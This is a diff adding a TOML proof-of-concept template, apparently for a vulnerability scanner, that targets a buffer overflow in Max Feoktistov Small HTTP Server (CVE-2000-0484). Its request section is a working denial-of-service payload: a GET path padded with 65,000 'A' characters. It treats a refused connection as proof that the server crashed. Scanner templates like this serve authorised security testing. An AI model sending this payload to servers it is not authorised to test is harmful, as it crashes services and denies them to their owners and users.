@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "Max Feoktistov Small HTTP Server 1.212/3.06 存在缓冲区溢出漏洞，通过发送超长 GET 请求（65000+ 字节）可导致服务崩溃，造成拒绝服务。"
+id = "POC-AVE-2000-0410"
+name = "Small HTTP Server Buffer Overflow DoS PoC"
+severity = "medium"
+tags = ["cve-2000-0484"]
+vuln_id = [
+    "CVE-2000-0484",
+    "AVE-2000-0410",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{repeat('A', 65000)}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "EOFError",
+    "Connection refused",
+    "connection refused",
+]
